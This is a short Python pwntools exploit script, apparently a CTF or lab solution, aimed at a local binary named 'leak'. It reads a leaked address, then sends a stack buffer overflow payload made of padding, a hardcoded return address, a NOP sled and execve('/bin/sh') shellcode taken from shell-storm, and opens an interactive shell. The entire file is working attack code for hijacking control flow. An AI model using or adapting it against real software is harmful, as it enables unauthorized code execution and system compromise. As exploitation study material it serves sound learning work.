#!/usr/bin/python

from pwn import *
import time

def main():
	app = "./leak"
	pad = "A" * 16
	io = process([app, pad])

	leak = io.recv() # Value after `Leaky`.
	leak = leak.strip() # Strips newlines.

	app_leak = leak[ leak.rfind('A') + 1 : ] # Only finds the leaked address.
	dump_file(app_leak, "app_leak") # For debugging purposes.

	app_leak = unpack(app_leak, 24) # Unpack address from packed binary data into integer

	log.success("App address leak(not applicable for classic) : 0x%x" % app_leak)
	
	ret = 0x7fffffffe4b0 + 8 + 32 # Jump to middle of nopsled
	nop = '\x90' * 32 # Nop Sled

	# http://shell-storm.org/shellcode/files/shellcode-806.php
	sh_code = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

	pay = 'B' * 24
	pay += p64(ret)
	pay += nop
	pay += sh_code

	raw_input( str(io.proc.pid) )

	io.sendline(pay)
	io.interactive()


def dump_file(data, filename):
	with open(filename, 'w') as f:
		f.write(data)	


if __name__ == "__main__":
	main()
